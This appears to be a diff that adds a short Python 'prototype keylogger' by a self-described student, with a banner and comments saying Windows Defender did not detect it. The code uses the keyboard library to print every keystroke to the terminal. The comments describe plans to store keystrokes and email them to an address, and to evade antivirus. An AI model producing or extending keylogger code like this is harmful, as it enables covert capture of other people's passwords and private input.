@@ -1,0 +1,28 @@
+print(''' 
+███████ ██   ██  █████  ██████  ██ ███████ ███████ 
+██      ██   ██ ██   ██ ██   ██ ██ ██      ██      
+███████ ███████ ███████ ██████  ██ █████   █████   
+     ██ ██   ██ ██   ██ ██   ██ ██ ██      ██      
+███████ ██   ██ ██   ██ ██   ██ ██ ██      ██    ''') 
+
+#AUTHOR:AIMAN SHARIFF
+#OBSERVATION :I NOTICED THAT MY WINDOWS 10 DEFENDER DID NOT DETECT THIS KEYLOGGER ON MY SYSTEM AND IT BASICALLY JUST RECORDED KEYSTROKES OF MINE, LOL! 
+#NOTE:THIS IS JUST FOR EDUCATIONAL PURPOSES,AS I HAVE PASSION IN CYBER SECURITY I HAVE JUST MADE THIS PROTOTYPE KEYLOGGER AS A POV FROM THE RED TEAM TO FIND LOOPHOLES IN DETECTION OF KEYLOGGER BY  ANTIVIRUS
+#IM A STUDENT OF VVCE WHO JUST CREATED THIS FOR FUN THAT'S IT ,NOT FOR ANY MISUSE OF THIS CODE....
+#THE KEYSTROKES ARE RECORDED IF THE FILE IS OPEN AND ITS SEEN IN THE TERMINAL,I LOOK FORWARD TO DEVELOP THIS BY STORING THESE KEYSTROKES AND EMAILING TO A PARTICULAR EMAIL
+#ALSO THIS IS A PROTOTYPE AND NOT SOME ADVANCED KEYLOGGER, WHICH CANNOT BYPASS AVG,avast, etc.
+
+
+
+import keyboard
+
+def on_press(event):
+    print(event.name, "pressed")
+
+def on_release(event):
+    if event.name == "esc":
+        return False
+
+keyboard.on_press(on_press)
+keyboard.on_release(on_release)
+keyboard.wait('esc') 
